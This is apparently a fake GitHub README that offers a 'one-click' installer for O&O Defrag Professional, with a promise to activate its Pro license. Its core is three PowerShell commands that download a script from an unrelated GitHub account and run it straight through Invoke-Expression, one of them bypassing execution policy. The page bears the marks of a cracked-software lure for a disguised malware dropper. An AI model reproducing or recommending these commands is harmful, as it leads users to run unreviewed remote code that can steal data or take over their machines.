# O O Defrag Professional Setup
One-click setup for O O Defrag Professional Setup -- the professional Windows drive defragmenter and SSD optimizer that reorganizes file storage for faster boot times and quicker application loading without harming drive lifespan

Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## Features

- Scans all connected drives and generates a fragmentation analysis with a visual fragmentation map per drive.
- Calculates the optimal defragmentation strategy for each drive type including spinning HDD and solid-state SSD.
- Activates the Pro license and enables scheduled defragmentation and the SOLID SSD optimization mode.
- Runs the first pass and reports the performance improvement percentage for each optimized drive.

## System Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~50 MB free disk space

## Common Issues

**Defragmentation runs for many hours without finishing on a drive that is nearly full**

Free at least 15 percent of the drive capacity first -- the tool requires working space to reorganize file clusters.

**O and O shows high fragmentation on the SSD and standard defrag would reduce drive write endurance**

Use SOLID optimization mode for SSDs instead of standard defrag -- it reorganizes the file index without unnecessary write cycles.

**Alternative method (if policy blocks execution):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- update PowerShell or use the full form:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.